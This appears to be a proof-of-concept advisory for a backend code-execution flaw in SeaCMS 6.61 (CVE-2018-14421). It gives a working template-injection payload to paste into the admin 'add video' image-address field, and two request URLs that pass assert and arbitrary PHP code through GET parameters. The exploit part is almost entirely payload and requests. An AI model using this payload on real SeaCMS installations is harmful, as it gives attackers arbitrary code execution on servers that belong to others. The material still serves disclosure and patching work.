## Affected Version 6.61



## POC



后台的-->添加影片--> 图片地址-->payload

`{if:1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//}{end if}`

![](http://opmi2ydgh.bkt.clouddn.com//18-7-31/2272010.jpg)



访问



`http://192.168.0.6/seacms661/detail/?1.html&a=assert&b=phpinfo();`

`http://192.168.0.6/seacms661/search.php?searchtype=5&tid=0&a=assert&b=phpinfo();`



![](http://opmi2ydgh.bkt.clouddn.com//18-7-31/68446790.jpg)



## References



[seacms backend getshell](http://hexo.imagemlt.xyz/post/seacms-backend-getshell/index.html)

[CVE-2018-14421——Seacms后台getshell分析](https://www.anquanke.com/post/id/152764)







